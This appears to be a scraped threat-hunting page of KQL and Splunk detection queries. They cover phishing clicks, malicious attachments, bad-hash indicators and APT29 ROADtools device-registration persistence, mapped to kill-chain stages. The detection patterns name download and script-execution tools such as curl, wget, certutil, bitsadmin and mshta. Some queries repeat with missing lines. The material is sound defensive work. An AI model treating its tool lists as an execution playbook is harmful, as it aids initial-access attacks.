          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
``` Phishing-link click that drives endpoint execution within 60s ```

    from datamodel=Web

    [| tstats summariesonly=false count

         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats summariesonly=false earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count
    from datamodel=Email.All_Email
    where All_Email.file_name!="-"
    by All_Email.src_user, All_Email.recipient, All_Email.file_name, All_Email.subject
| rename All_Email.recipient as user
| join type=inner user
    [| tstats `summariesonly` count
        from datamodel=Endpoint.Processes
        where Processes.parent_process_name IN ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
          AND Processes.process_name IN ("cmd.exe","powershell.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe")
        by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
     | rename Processes.user as user]
| tstats summariesonly=false count
    from datamodel=Email.All_Email
    where All_Email.file_name!="-"
    by All_Email.src_user, All_Email.recipient, All_Email.file_name, All_Email.subject
| rename All_Email.recipient as user
| join type=inner user
    [| tstats summariesonly=false count
        from datamodel=Endpoint.Processes
        where Processes.parent_process_name IN ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
          AND Processes.process_name IN ("cmd.exe","powershell.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe")
        by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
     | rename Processes.user as user]

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["44f4f7aca7f1d9bfdaf7b3736934cbe19f851a707662f8f0b0c49b383e054250", "332ba2f0297dfb1599adecc3e9067893e7cf243aa23aedce4906a4c480574c17", "0db36a04d304ad96f9e6f97b531934594cd95a5cea9ff2c9af249201089dc864", "38bd137c672bd58d08c4f0502f993a6561e2c3411773d1ae57ee0151a0a9d11d", "d4a7e9f107fe40c1a5d0139c6c6e25bf6bf57f61feff090bee28f476bb3cc3c2", "bc3b44154518c5794ce639108e7b9c5fecb0c189607a26de1aaed518d890c7ad", "74882085db2088356ed7f72f01e0404a0a98cda88ef56fb15ce74c1f36b26d27", "9cf029daca89523d917dafed0568d11d00e45ec96b5b90b4a1f7fd4018c7da84", "b19e06da580cf91691eda066ac9ee4b09c6e5dc26c367af12660fe1f9306eec4", "8808c794c24367438f183e4be941876f1d3ecd0c8d2eb43b10d2380841d2283b", "43dc62cef52ebdd69e79f10015b3e13890f26c058325c0ff139c70f8d8eadcfa", "9e4a658e6d831c9e9bdfe11884a75b7c64812ed0a80e8495ddf6b316505acac1"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] UTA0355 device-code phishing: deviceCode auth flow with cross-IP token redemption · Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Curious Serpens / APT29 ROADtools-pattern: device registration immediately following non-interactive token acquisition · RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] ROADtools roadtx FOCI client-ID swap: refresh-token resource hop across MS Office FOCI app IDs
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Remote service execution — PsExec / SMB lateral movement · OAuth consent / suspicious app grant
[LLM] Curious Serpens / APT29 ROADtools-pattern: device registration immediately following non-interactive token acquisition Installation Medium
Hunts for the ROADtools roadtx device-registration sequence where an Entra ID device is registered (T1098.005) shortly after a non-interactive token grant — the pattern Microsoft attributed to Midnight Blizzard / Curious Serpens. Catches attacker-controlled devices being joined as a persistence foothold after token theft. Rationale: Article ties Cloaked Ursa/APT29 and Curious Serpens to ROADtools device-registration persistence (T1098.005). The roadtx module registers devices using one of the public FOCI client IDs (Azure CLI 04b07795, Azure PowerShell 1b730954, Microsoft Office d3590ed6) via non-interactive token flows — joining that to the Audit-Log device add within 30 minutes from a different IP catches the attacker-device persistence pattern. Cross-checked Microsoft Threat Intel reporting on Midnight Blizzard ROADtools usage. Cross-checked against: • https://www.microsoft.com/en-us/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/ • https://attack.mitre.org/techniques/T1098/005/ • https://www.volexity.com/blog/2025/04/22/phishing-for-codes-russian-threat-actors-target-microsoft-365-oauth-workflows/
ATT&CKT1098.005 T1550
